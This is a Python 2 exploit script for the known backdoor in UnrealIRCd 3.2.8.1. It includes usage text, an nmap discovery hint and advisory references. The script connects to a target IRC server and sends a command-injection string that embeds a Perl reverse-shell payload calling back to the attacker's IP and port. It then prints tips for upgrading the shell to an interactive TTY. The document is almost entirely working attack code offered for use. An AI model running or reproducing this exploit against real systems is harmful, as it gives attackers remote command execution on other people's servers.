#!/usr/bin/python

import socket
import os
import sys
from sys import argv

if len(sys.argv) < 5:
    print "[!] Usage: python unrealircdick.py [LOCAL IP] [LOCAL PORT] [TARGET IP] [TARGET PORT]"
    print "[*] This script exploits a backdoor that may be present in UnrealIRCD 3.2.8.1 downloaded from Nov 2009 - Jun 2010"
    print "[*] Listen on [LOCAL PORT] for the incoming shell"
    print "[?] Discovery: nmap -sV --script=irc-unrealircd-backdoor <target>"
    print "[*] References: https://lwn.net/Articles/392201/ https://seclists.org/fulldisclosure/2010/Jun/277"
    exit()

script, local_ip, local_port, target_ip, target_port = sys.argv

# msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT>
payload = "AB;perl -MIO -e " + '\'$p=fork;exit,if($p);foreach my $key(keys %%ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};\'' % (local_ip, local_port)

print "\n" + "[*] Payload >: "
print "\n" + payload + "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((target_ip, int(target_port)))
    data=s.recv(1024)
    print "[*] Connecting to target >:....."
    os.system("sleep 5")
    print "[*] Response >:....."
    print "\n" + data
    s.send(payload)
    print "[*] Payload sent >:....."
    print "[*] Standby to receive shell on port %s!" % (local_port)
    print "[*] Clean up your shell you dirty peasant >:...." + "\n"
    print """
    python -c 'import pty;pty.spawn("/bin/bash")'   # upgrade to interactive tty
    export TERM=xterm                               # set TERM variable so you can clear the screen
    Ctrl+Z + stty raw -echo + fg                    # pass keyboard shortcuts to shell
    """
except:
    print "[!] Connection error"
    exit()
